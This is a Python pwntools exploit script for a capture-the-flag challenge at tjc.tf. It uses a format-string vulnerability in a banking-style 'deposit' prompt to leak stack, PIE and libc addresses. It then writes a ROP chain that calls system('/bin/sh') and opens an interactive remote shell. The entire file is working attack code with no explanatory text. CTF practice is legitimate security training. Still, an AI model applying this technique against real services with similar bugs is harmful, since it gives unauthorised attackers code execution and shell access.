from pwn import *

elf = ELF("./chall_patched")

context.binary = elf
libc = ELF("libc.so.6")

# p = process(stdout=PIPE)
# gdb.attach(p)
p = remote("tjc.tf", 31363)

def exec_fmt(payload):
    p.sendlineafter(b'exit) ', b'deposit')
    p.sendlineafter(b'amount: ', payload)

    return p.recvline(timeout=1).strip()

stack = int(p.recvuntil(b', ', drop=True), 16) - 56
pie_base = int(exec_fmt("%167$p"), 16) - elf.symbols['main']
libc_base = u64(exec_fmt(b'%13$saaa' + pack(pie_base + elf.got['atoi']))[:6].ljust(8, b'\x00')) - libc.symbols['atoi']

print(hex(pie_base), hex(libc_base), hex(stack))


fmtstr = FmtStr(exec_fmt, offset=12)
payload = pack(0x000000000000101a + pie_base) + pack(0x000000000010f75b + libc_base) + pack(next(libc.search(b'/bin/sh')) + libc_base) + pack(libc_base + libc.symbols['system'])
fmtstr.write(stack, payload)

fmtstr.execute_writes()

p.interactive()
